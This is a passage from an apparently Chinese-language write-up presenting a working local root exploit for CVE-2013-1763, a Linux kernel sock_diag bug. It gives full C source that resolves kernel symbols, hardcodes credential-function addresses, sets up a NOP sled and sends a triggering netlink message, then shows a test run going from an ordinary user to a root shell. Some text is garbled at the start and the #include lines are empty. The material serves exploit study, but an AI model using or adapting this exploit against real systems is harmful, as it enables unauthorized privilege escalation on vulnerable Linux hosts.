        } req;
        char buf[8192];
        //创建netlink协议的socket
        if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) hash.rehash_time, index 81
    * 
    * Fedora 18 support added
    * 
    * 2/2013
    */
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
    _commit_creds commit_creds;
    _prepare_kernel_cred prepare_kernel_cred;
    unsigned long sock_diag_handlers, nl_table;
    int __attribute__((regparm(3))) //获取root权限
    kernel_code()
    {
        commit_creds(prepare_kernel_cred(0));
        return -1;
    }
    int jump_payload_not_used(void *skb, void *nlh)
    {
        asm volatile (
            "mov $kernel_code, %eax\n"
            "call *%eax\n"
        );
    }
    unsigned long
    get_symbol(char *name)
    {
        FILE *f;
        unsigned long addr;
        char dummy, sym[512];
        int ret = 0;
        f = fopen("/proc/kallsyms", "r");
        if (!f) {
            return 0;
        }
        while (ret != EOF) {
            ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
            if (ret == 0) {
                fscanf(f, "%s\n", sym);
                continue;
            }
            if (!strcmp(name, sym)) {
                printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
                fclose(f);
                return addr;
            }
        }
        fclose(f);
        return 0;
    }
    int main(int argc, char*argv[])
    {
        int fd;
        unsigned family;
        struct {
            struct nlmsghdr nlh;
            struct unix_diag_req r;
        } req;
        char buf[8192];
        if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) 255){
            printf("nl_table is too far!\n");
            exit(1);
            }
        }
        else if(strcmp(argv[1],"Ubuntu")==0){
          commit_creds = (_commit_creds) 0xc10600a0;
          prepare_kernel_cred = (_prepare_kernel_cred) 0xc1060360;
          req.r.sdiag_family = 99; //c19a00cc - c199ff40 = nl_table - sock_diag_handlers = 99L
        }
        unsigned long mmap_start, mmap_size;
        mmap_start = 0x10000;
        mmap_size = 0x120000;
        printf("mmapping at 0x%lx, size = 0x%lx\n", mmap_start, mmap_size);
            if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
                    printf("mmap fault\n");
                    exit(1);
            }
        memset((void*)mmap_start, 0x90, mmap_size); //将申请的内存区域全部填充为nop
        char jump[] = "\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"; // jump_payload in asm
        unsigned long *asd = &jump[4];  //将\x11全部替换成kernel_code
        *asd = (unsigned long)kernel_code;
        //把jump_payload放进mmap的内存的最后
        memcpy( (void*)mmap_start+mmap_size-sizeof(jump), jump, sizeof(jump));
        send(fd, &req, sizeof(req), 0); //发送socket触发漏洞
        printf("uid=%d, euid=%d\n",getuid(), geteuid() );
        system("/bin/sh");
    }
编译测试结果：
    edvison@edvison:~$ uname -a
    Linux edvison 3.8.0 #1 SMP Wed Feb 14 21:38:25 CST 2018 i686 i686 i686 GNU/Linux
    edvison@edvison:~$ id
    uid=1000(edvison) gid=1000(edvison) 组=1000(edvison),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(kvm),130(libvirtd)
    edvison@edvison:~$ gcc -g cve-2013-1763.c -o cve-2013-1763 -I /home/edvison/linux-3.8/
    cve-2013-1763.c: In function ‘main’:
    cve-2013-1763.c:148:23: warning: initialization from incompatible pointer type
      unsigned long *asd = &jump[4];  //将\x11全部替换成kernel_code
                           ^
    edvison@edvison:~$ ./cve-2013-1763 Ubuntu 
    mmapping at 0x10000, size = 0x120000
    uid=0, euid=0
    # id
    uid=0(root) gid=0(root) 组=0(root)
    # exit
#### 0x06 参考链接
绕过smep：  
ret2dir：  
内核ROP第一部分：  
内核ROP第二部分：  
cve-2013-1763 exploit：  
cve-2013-1763 exploit 代码分析 ：  
netlink机制：